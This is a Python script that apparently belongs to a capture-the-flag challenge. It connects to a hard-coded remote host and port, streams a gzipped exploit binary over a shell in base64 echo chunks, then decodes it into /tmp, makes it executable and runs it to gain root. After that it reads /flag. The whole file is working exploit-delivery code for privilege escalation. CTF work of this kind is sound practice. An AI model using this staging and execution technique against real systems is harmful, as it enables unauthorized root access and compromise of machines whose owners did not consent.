#!/usr/bin/env python3
"""Upload exploit: blast all echo commands, then decode."""
import socket
import time
import base64

HOST = '154.57.164.73'
PORT = 31873

def main():
    with open('exploit.gz', 'rb') as f:
        compressed = f.read()
    
    b64 = base64.b64encode(compressed).decode()
    print(f"[*] Binary: {len(compressed)} bytes, b64: {len(b64)} chars")
    
    # Build ALL echo commands into a single payload
    chunk_size = 800
    chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
    print(f"[*] {len(chunks)} chunks of {chunk_size}")
    
    # Build one big payload with all commands separated by newlines
    lines = []
    lines.append("> /tmp/b")  # create/clear file
    for i, chunk in enumerate(chunks):
        lines.append(f"echo -n '{chunk}' >> /tmp/b")
    lines.append("echo UPLOAD_DONE")
    payload = '\n'.join(lines)
    print(f"[*] Payload: {len(payload)} bytes, {len(lines)} lines")
    
    s = socket.socket()
    s.settimeout(120)
    s.connect((HOST, PORT))
    
    # Wait for boot
    data = b''
    while b'/ $' not in data:
        data += s.recv(4096)
    print(f"[*] Boot ({len(data)} bytes)")
    
    # Send ALL commands at once
    print("[*] Uploading...")
    s.sendall(payload.encode() + b'\n')
    
    # Wait for UPLOAD_DONE marker
    data = b''
    deadline = time.time() + 120
    while b'UPLOAD_DONE' not in data and time.time() < deadline:
        try:
            chunk = s.recv(65536)
            if not chunk:
                break
            data += chunk
            if len(data) % 50000 == 0:
                print(f"  received {len(data)} bytes...")
        except socket.timeout:
            break
    
    print(f"[*] Upload finished: received {len(data)} bytes of output")
    
    # Wait for prompt
    while b'/ $' not in data and time.time() < deadline:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
        except: break
    
    # Check size
    s.sendall(b"wc -c /tmp/b\n")
    time.sleep(3)
    data = b''
    while b'/ $' not in data:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
        except: break
    print(f"  File size: {data.decode(errors='replace').strip()}")
    
    # Decode
    print("[*] Decoding...")
    s.sendall(b"base64 -d < /tmp/b | gunzip > /tmp/e; echo DECODE_DONE\n")
    time.sleep(5)
    data = b''
    while b'DECODE_DONE' not in data:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
        except: break
    
    s.sendall(b"chmod +x /tmp/e; ls -la /tmp/e\n")
    time.sleep(3)
    data = b''
    while b'/ $' not in data:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
        except: break
    print(f"  {data.decode(errors='replace').strip()}")
    
    # Run exploit
    print("[*] Running exploit...")
    s.sendall(b"/tmp/e\n")
    
    data = b''
    deadline = time.time() + 180
    while b'/ $' not in data and time.time() < deadline:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            data += chunk
        except socket.timeout:
            break
    
    output = data.decode(errors='replace')
    print(output)
    
    if 'GOT ROOT' in output:
        s.sendall(b"cat /flag\n")
        time.sleep(3)
        try:
            flag = s.recv(4096).decode(errors='replace')
            print(f"[+] Flag: {flag}")
        except:
            pass
    
    s.close()

if __name__ == '__main__':
    main()
